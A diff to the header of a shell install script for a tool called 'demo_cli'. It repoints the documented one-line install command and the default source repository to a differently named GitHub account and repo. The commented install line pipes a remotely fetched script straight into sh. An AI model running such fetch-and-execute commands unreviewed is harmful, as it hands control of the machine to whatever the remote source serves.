@@ -1,7 +1,7 @@
 #!/usr/bin/env sh
 # demo_cli one-command install (macOS / Linux).
 #
-#   curl -fsSL https://raw.githubusercontent.com/WePwn/demo_cli/v0.4.0-beta.8/install.sh | sh
+#   curl -fsSL https://raw.githubusercontent.com/nizaryart/DEMO_LOADING/v1.0.5/install.sh | sh
 #
 # Yes, this is curl-pipe-sh. demo_cli's whole point is that you read code
 # before you run it, so read this first - it is short and does four things:
@@ -9,7 +9,7 @@
 # tool's own workspace, and it phones nobody.
 set -eu
 
-REPO="${DEMO_CLI_LOCAL:-git+https://github.com/WePwn/demo_cli.git@v0.4.0-beta.8}"
+REPO="${DEMO_CLI_LOCAL:-git+https://github.com/nizaryart/DEMO_LOADING.git@v1.0.5}"
 say()  { printf '%s\n' "$*"; }
 ok()   { printf '\033[32m%s\033[0m\n' "$*"; }
 warn() { printf '\033[33m%s\033[0m\n' "$*"; }
